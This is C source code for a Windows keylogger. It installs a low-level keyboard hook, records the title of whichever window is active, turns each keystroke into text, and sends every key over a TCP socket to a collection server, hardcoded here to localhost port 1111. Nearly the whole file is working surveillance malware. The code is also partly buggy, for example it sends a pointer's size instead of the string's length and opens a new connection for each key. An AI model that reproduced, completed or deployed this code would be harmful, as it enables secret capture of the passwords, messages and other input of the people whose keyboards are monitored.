#include "../include/functions.h"

const int SPECIALS_CODES[SPECIALS_LENGTH] = {VK_BACK, VK_RETURN, VK_SPACE, VK_TAB, VK_SHIFT, VK_RSHIFT, VK_LSHIFT, VK_CONTROL,
    VK_LCONTROL, VK_RCONTROL, VK_ESCAPE, VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_END, 190, 110, 189, 109, 20};

const char* SPECIALS[SPECIALS_LENGTH] = { "[BACKSPACE]", "\n", " ", "[TAB]", "[SHIFT]", "[R_SHIFT]", "[L_SHIFT]", "[CTRL]", 
    "[L_CTRL]", "[R_CTRL]", "[ESC]", "[HOME]", "[LEFT]", "[RIGHT]", "[UP]", "[DOWN]", "[END]", ".", ".", "-", "-", "[CAPS_LOCK]"};

HHOOK hook;
KBDLLHOOKSTRUCT kb_struct;
char prev_prog_name[PROG_NAME_LENGTH];
char curr_prog_name[PROG_NAME_LENGTH];

WSADATA wsa_data;
WORD dll_version = MAKEWORD(2, 1);

SOCKADDR_IN addr;
SOCKET connection;
int sizeofaddr = sizeof(addr);

const char RETURN[2] = {'\n' , '\0'};

int find_key(int key) {
    for (int i = 0; i < SPECIALS_LENGTH; i++) {
        if (SPECIALS_CODES[i] == key) {
            return i;
        }
    }
    return -1;
}

inline int connect_to_serv() {
    if (WSAStartup(dll_version, &wsa_data) != 0) {
        printf("Error, can`t start wsa");
        exit(1);
    }

	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(1111);
	addr.sin_family = AF_INET;

    connection = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        printf("Error, can't connect to server!\n");
        return 1;
    }

    return 0;
}

void send_to_serv(int conn, char* msg) {
    if (conn == 0) {
        send(connection, msg, sizeof(msg), NULL);
    }
    else {
        printf("Error in connection to server!\n");
    }
}

int save(int key) {
    if (key == 1 || key == 2) {
        return 0;
    }

    HWND foreground = GetForegroundWindow();
    DWORD thread_id;
    HKL keyboard;

    if (foreground != NULL) {

        char* prog_name[256];

        thread_id = GetWindowThreadProcessId(foreground, NULL);
        keyboard = GetKeyboardLayout(thread_id);

        GetWindowText(foreground, curr_prog_name, PROG_NAME_LENGTH);

        if (strcmp(prev_prog_name, curr_prog_name) != 0) {
            strcpy_s(prev_prog_name, PROG_NAME_LENGTH, curr_prog_name);
            send_to_serv(connect_to_serv(), RETURN);
            send_to_serv(connect_to_serv(), curr_prog_name);
            send_to_serv(connect_to_serv(), RETURN);
        }
    }
    else {
        keyboard = NULL;
    }

    printf("%d\n", key);

    int i = find_key(key);
    if (i > 0) {
        send_to_serv(connect_to_serv(), SPECIALS[i]);
    }

    char curr_key;
    curr_key = (char)MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, keyboard);
    char str[2] = {curr_key , '\0'};
    send_to_serv(connect_to_serv(), str);

    return 0;
}

LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param) {
    if (n_code >= 0) {
        if (w_param == WM_KEYDOWN) {
            kb_struct = *((KBDLLHOOKSTRUCT*)l_param);
            save(kb_struct.vkCode);
        }
    }
    
    return CallNextHookEx(hook, n_code, w_param, l_param);
}